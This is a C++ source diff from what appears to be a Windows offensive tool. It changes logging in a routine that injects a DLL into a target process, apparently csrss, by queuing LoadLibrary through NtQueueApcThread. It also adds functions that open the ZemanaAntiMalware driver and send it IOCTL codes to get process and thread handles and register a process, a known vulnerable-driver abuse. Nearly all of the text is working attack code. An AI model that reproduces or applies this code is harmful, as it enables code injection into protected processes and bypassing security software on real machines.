@@ -1,4 +1,6 @@
 #include "Utility.h"
+// TEXT 오류시 사용
+#include <winnt.rh>
 #pragma warning (disable:4996)
 
 // Undocumented Function type definition
@@ -149,7 +151,8 @@ BOOL DllLoader(LPSTR dll_name, LPSTR proc_name) {
 	GetCurrentDirectoryA(256, dll_path);
 	strncat(dll_path, "\\", 2);
 	strncat(dll_path, dll_name, strlen(dll_name));
-	printf("dll_path : %s\n", dll_path);
+//	printf("dll_path : %s\n", dll_path);
+	println("[INFO] DLL_PATH : " + (std::string)dll_path);
 
 	// Write dll path in target process memory
 	target_mem_dll_path = VirtualAllocEx(hBypass, NULL, strlen(dll_path) + 1, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
@@ -163,27 +166,90 @@ BOOL DllLoader(LPSTR dll_name, LPSTR proc_name) {
 	do {
 		// if target find(csrss) then
 		if (te.th32OwnerProcessID == targetPID) {
-			std::cout << "[STATUS] Found Thread : " << te.th32OwnerProcessID << std::endl;
+//			std::cout << "[STATUS] Found Thread : " << te.th32OwnerProcessID << std::endl;
+			println("[INFO] Found Thread : ", te.th32OwnerProcessID);
 			CLIENT_ID cid;
 			// Initialize target pid and tid
 			cid.UniqueProcess = (HANDLE)te.th32OwnerProcessID;
 			cid.UniqueThread = (HANDLE)te.th32ThreadID;
-			std::cout << "[STATUS] cid.UniqueProcess : " << cid.UniqueProcess << std::endl;
-			std::cout << "[STATUS] cid.UniqueTHread : " << cid.UniqueThread << std::endl;
-			std::cout << "[STATUS] Found Thread " << std::endl;
+//			std::cout << "[STATUS] cid.UniqueProcess : " << cid.UniqueProcess << std::endl;
+//			std::cout << "[STATUS] cid.UniqueTHread : " << cid.UniqueThread << std::endl;
+//			std::cout << "[STATUS] Found Thread " << std::endl;
+			println("[INFO] cid.UniqueProcess : ", (DWORD)cid.UniqueProcess);
+			println("[INFO] cid.UniqueTHread : ", (DWORD)cid.UniqueThread);
+			println("[INFO] Found Thread ");
 			hThread = OpenThread(GENERIC_ALL, 0, (DWORD)cid.UniqueThread);
-			std::cout << "hThread : " << hThread << std::endl;
+//			std::cout << "hThread : " << hThread << std::endl;
+			println("[INFO] hThread : ", (DWORD)hThread);
 			if (hThread) {
-				std::cout << "Thread Opend!" << std::endl;
+//				std::cout << "Thread Opend!" << std::endl;
+				println("[INFO] Thread Opend!");
 				SuspendThread(hThread);
 				auto ret = fpNtQueueApcThread(hThread,
 					(PIO_APC_ROUTINE)fpLoadLibrary, target_mem_dll_path, NULL, NULL);
-				printf_s("Ret 0x%p\nError 0x%p\n", ret, GetLastError());
+//				printf_s("Ret 0x%p\nError 0x%p\n", ret, GetLastError());
+				println("[ERR ] Return 0x", ret);
+				println("[ERR ] Reason: ", GetLastError());
 				ResumeThread(hThread);
 				CloseHandle(hThread);
 			}
 		}
 	} while (Thread32Next(hTool, &te));
-	std::cout << "NtQueueApcThread ended.." << std::endl;
+//	std::cout << "NtQueueApcThread ended.." << std::endl;
+	println("[INFO] NtQueueApcThread ended..");
+	return TRUE;
+}
+BOOL MakeSendPacket(PREQUEST_HEADER req, uint8_t type, uint32_t address, char* buffer)
+{
+	req->type = type;
+	req->address = address;
+	memset(req->buffer, 0, 256);
+	if (buffer != NULL)
+		memcpy(req->buffer, buffer, sizeof(buffer));
+
+	return TRUE;
+}
+
+HANDLE GetDeviceHandleFromVulnDrv()
+{
+	HANDLE hDevice;
+
+	hDevice = CreateFile(
+		"\\\\.\\ZemanaAntiMalware",
+		GENERIC_READ | GENERIC_WRITE,
+		0,
+		NULL,
+		OPEN_EXISTING,
+		FILE_ATTRIBUTE_NORMAL,
+		NULL
+	);
+	if (!hDevice) {
+		printf("Can't not find device driver..\n");
+		return FALSE;
+	}
+	return hDevice;
+}
+
+HANDLE GetProcessHandleFromVulnDrv(HANDLE hDevice, ULONG pid)
+{
+	HANDLE hRecvProcess;
+	DeviceIoControl(hDevice, 0x8000204C, &pid, sizeof(ULONG), &hRecvProcess, sizeof(HANDLE), NULL, NULL);
+
+	return hRecvProcess;
+}
+
+HANDLE GetThreadHandleFromVulnDrv(HANDLE hDevice, ULONG tid)
+{
+	HANDLE hRecvThread;
+	DeviceIoControl(hDevice, 0x80002084, &tid, sizeof(ULONG), &hRecvThread, sizeof(HANDLE), NULL, NULL);
+
+	return hRecvThread;
+}
+
+BOOL RegisterProcessToVulnDrv(HANDLE hDevice, ULONG pid)
+{
+	if (!DeviceIoControl(hDevice, 0x80002010, &pid, sizeof(ULONG), NULL, 0, NULL, NULL)) {
+		return FALSE;
+	}
 	return TRUE;
 }
